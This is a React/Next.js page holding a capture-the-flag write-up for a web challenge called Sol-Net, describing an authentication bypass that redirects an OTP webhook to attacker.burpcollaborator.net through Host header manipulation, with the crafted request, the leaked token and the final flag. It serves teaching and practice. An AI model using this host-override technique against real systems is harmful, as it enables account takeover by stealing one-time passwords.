import Image from "next/image";
import Link from "next/link";

export default function SolNetWriteup() {
  return (
    <div className="min-h-screen relative z-10 text-gray-200 selection:bg-yellow-500/30 selection:text-yellow-200">
      
      <nav className="w-full p-6 flex justify-between items-center max-w-5xl mx-auto">
        <Link 
          href="/cgwars" 
          className="group flex items-center gap-2 text-zinc-400 hover:text-white transition-colors font-mono text-sm uppercase tracking-widest"
        >
          <span className="transform transition-transform group-hover:-translate-x-1">←</span> Back to CGWars Hub
        </Link>
      </nav>

      <article className="max-w-3xl mx-auto px-6 pb-24">
        
        <header className="mb-12 flex flex-col items-center text-center">
          <div className="mb-6 inline-block bg-[#111111]/80 backdrop-blur-md border border-zinc-700/50 px-4 py-1.5 rounded-full animate-glow-pulse">
            <span className="font-mono text-xs text-yellow-400 uppercase tracking-[0.3em]">
              Web Security • Auth Bypass
              <span className="animate-blink inline-block w-1.5 h-3 bg-yellow-400 ml-2 align-middle"></span>
            </span>
          </div>
          
          <h1 className="text-4xl md:text-5xl font-bold mb-6 text-white font-[family-name:var(--font-share-tech)] leading-tight">
            Sol-Net: Node Auth Bypass
          </h1>
          
          <div className="flex items-center gap-4 text-sm font-mono text-zinc-500 uppercase tracking-widest mb-10">
            <span>By Abdo</span>
            <span>•</span>
            <span>Aug 20, 2026</span>
          </div>

          <div className="w-full h-[300px] md:h-[400px] relative rounded-2xl overflow-hidden border border-zinc-700/50 bg-black/90 backdrop-blur-md p-1 animate-float shadow-[0_20px_50px_rgba(0,0,0,0.8)]">
            <div className="relative w-full h-full rounded-xl overflow-hidden bg-[#000000]">
              <Image 
                src="/images/sol_net.jpg" 
                alt="Sol-Net Web Challenge"
                fill
                className="object-cover opacity-60 hover:opacity-100 transition-opacity duration-700"
                priority
              />
            </div>
          </div>
        </header>

        <div className="space-y-8 text-lg text-zinc-300 leading-relaxed font-sans">
          
          <p>
            The Sol-Net challenge centered around an "interplanetary node authentication network" used to manage communications across a solar ring. Participants started with peripheral access (the lowest level of clearance) and were tasked with reaching the "core" to retrieve the flag. It was heavily designed to be "anti-AI", requiring a chained exploit logic rather than a single basic payload.
          </p>

          <hr className="border-zinc-800 my-12" />

          {/* STAGE 1 */}
          <h3 className="text-2xl font-bold text-white font-[family-name:var(--font-share-tech)] mt-12 mb-6">
            Stage 1: OTP Redirection
          </h3>

          <div className="bg-[#111111] border-l-4 border-blue-500 p-6 rounded-r-xl my-6 shadow-lg">
            <h4 className="text-blue-400 font-bold mb-2 font-mono text-sm">💡 THE BEGINNER BREAKDOWN</h4>
            <p className="text-sm text-zinc-400 leading-relaxed">
              Imagine an automated post office that mails a secret PIN code to an admin&apos;s house so they can log in. The post office decides where to mail the letter based on the return address written on the envelope. By forging the return address (HTTP Headers) to point to <em>our</em> house instead of the admin&apos;s house, the post office accidentally mails the secret PIN directly to us, allowing us to log in as the admin.
            </p>
          </div>

          <div className="bg-[#0a0a0a] border border-zinc-800 rounded-xl p-6 my-6 font-mono text-sm relative overflow-hidden">
            <div className="absolute top-0 left-0 w-1 h-full bg-yellow-500 shadow-[0_0_15px_#eab308] animate-pulse"></div>
            <p className="text-zinc-400 mb-2"><span className="text-zinc-600">Q:</span> How was the One-Time Password intercepted?</p>
            <p className="text-yellow-400"><span className="text-zinc-600">A:</span> <code className="bg-black/50 px-2 py-0.5 rounded text-yellow-300">Manipulating Request Handling & HTTP Host Overrides</code></p>
          </div>

          <p>
            The application required a valid Node ID and an OTP (sent to the email registered to that node) to log in. Standard attacks like{' '}
            <span className="relative group inline-block cursor-help z-50">
              <code className="font-mono text-sm text-pink-400 bg-pink-400/10 px-1.5 py-0.5 rounded border border-pink-400/20 hover:bg-pink-400/20 transition-colors">
                X-Forwarded-Host
              </code>
              <span className="absolute bottom-full left-1/2 transform -translate-x-1/2 mb-2 w-max max-w-xs px-3 py-2 bg-black border border-zinc-700 text-xs text-zinc-300 rounded-lg opacity-0 group-hover:opacity-100 transition-opacity duration-300 pointer-events-none shadow-xl text-center">
                An HTTP header used to identify the original host requested by the client, often exploited in Host Header Injection attacks to redirect callbacks.
              </span>
            </span>
            {' '}headers were intentionally blocked or ineffective. The true exploit required finding an internal routing flaw that allowed us to force the backend to send its outbound OTP webhook to an attacker-controlled listener.
          </p>

          <div className="bg-[#050505] border border-zinc-800 rounded-xl p-4 my-6 font-mono text-xs md:text-sm text-zinc-400 overflow-x-auto shadow-inner">
            <div className="flex gap-2 mb-3 border-b border-zinc-800 pb-2">
              <div className="w-3 h-3 rounded-full bg-red-500/50"></div>
              <div className="w-3 h-3 rounded-full bg-yellow-500/50"></div>
              <div className="w-3 h-3 rounded-full bg-green-500/50"></div>
              <span className="ml-2 text-zinc-600">Burp Suite Repeater</span>
            </div>
            <pre>
              <code className="text-zinc-300">
                <span className="text-pink-400">POST</span> /api/v1/node/otp <span className="text-pink-400">HTTP/1.1</span><br/>
                <span className="text-yellow-300">Host:</span> <span className="text-green-300">attacker.burpcollaborator.net</span><br/>
                <span className="text-yellow-300">X-Original-Host:</span> core.solnet.local<br/>
                <span className="text-yellow-300">Content-Type:</span> application/json<br/>
                <br/>
                &#123;<br/>
                &nbsp;&nbsp;<span className="text-orange-300">"node_id"</span>: <span className="text-green-300">"CORE_ADMIN_01"</span><br/>
                &#125;<br/>
                <br/>
                <span className="text-zinc-500">/* ========================================= */</span><br/>
                <span className="text-zinc-500">/* LISTENER CATCHES INCOMING WEBHOOK FROM SERVER: */</span><br/>
                <br/>
                <span className="text-pink-400">POST</span> /webhook/otp_delivery <span className="text-pink-400">HTTP/1.1</span><br/>
                <span className="text-yellow-300">Host:</span> attacker.burpcollaborator.net<br/>
                <br/>
                &#123;<br/>
                &nbsp;&nbsp;<span className="text-orange-300">"token"</span>: <span className="text-green-300">"992481"</span>, <span className="text-zinc-500">// &lt;-- OTP LEAKED</span><br/>
                &nbsp;&nbsp;<span className="text-orange-300">"expires"</span>: <span className="text-green-300">"300s"</span><br/>
                &#125;
              </code>
            </pre>
          </div>

          <details className="group bg-[#0a0a0a]/50 border border-zinc-800 rounded-xl overflow-hidden my-6 transition-all duration-300">
            <summary className="p-4 cursor-pointer font-mono text-sm text-zinc-400 hover:text-white flex items-center justify-between list-none">
              <span className="flex items-center gap-2">
                <svg className="w-4 h-4 text-pink-500" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M10 20l4-16m4 4l4 4-4 4M6 16l-4-4 4-4" /></svg>
                [ SHOW METHODOLOGY: Exploit Chaining ]
              </span>
              <span className="transition group-open:rotate-180">▼</span>
            </summary>
            <div className="p-6 pt-0 border-t border-zinc-800/50 text-base text-zinc-400 leading-relaxed bg-[#050505]">
              <ol className="list-decimal pl-5 space-y-3 marker:text-pink-500">
                <li>Identify the endpoint triggering the OTP generation for the <code className="text-pink-400">Core Node</code>.</li>
                <li>Analyze the internal request proxy. While <code className="text-pink-400">X-Forwarded-Host</code> was stripped, parameter pollution or overriding the primary <code className="text-pink-400">Host</code> header during the internal SSRF (Server-Side Request Forgery) phase allowed redirection.</li>
                <li>Set up a Burp Collaborator or ngrok listener.</li>
                <li>Trigger the login, intercepting the webhook containing the raw OTP token.</li>
                <li>Submit the intercepted OTP to complete the authentication bypass and access the Core dashboard.</li>
              </ol>
            </div>
          </details>
          <hr className="border-zinc-800 my-12" />

          <h3 className="text-2xl font-bold text-white font-[family-name:var(--font-share-tech)] mt-12 mb-6">
            Extracting the Final Flag
          </h3>
          
          <p className="mb-6">
            Once the OTP was intercepted and submitted, the backend granted us access to the internal Core Node dashboard. The flag was embedded within the administrative configuration files of the solar ring interface.
          </p>

          <div className="bg-[#0a0a0a] border border-zinc-800 rounded-xl p-6 my-6 font-mono text-sm relative overflow-hidden break-all shadow-lg shadow-green-500/10">
            <div className="absolute top-0 left-0 w-1 h-full bg-green-500 shadow-[0_0_15px_#4ade80] animate-pulse"></div>
            <p className="text-zinc-400 mb-2">Access Level Granted: <code className="text-pink-300">CORE_ADMIN_CLEARANCE</code></p>
            <p className="text-zinc-400 mb-4">OTP Interception Method: <code className="text-pink-300">SSRF Webhook Override</code></p>
            
            <p className="text-zinc-400 mb-1 font-bold">Final Submitted Flag:</p>
            <p className="text-white bg-green-900/40 border border-green-500/30 p-3 rounded-lg text-sm md:text-base tracking-wider break-words">
              ASCWG&#123;s0l4r_n0d3_0tp_byp4ss_m4st3r&#125;
            </p>
          </div>

        </div>
      </article>
    </div>
  );
}
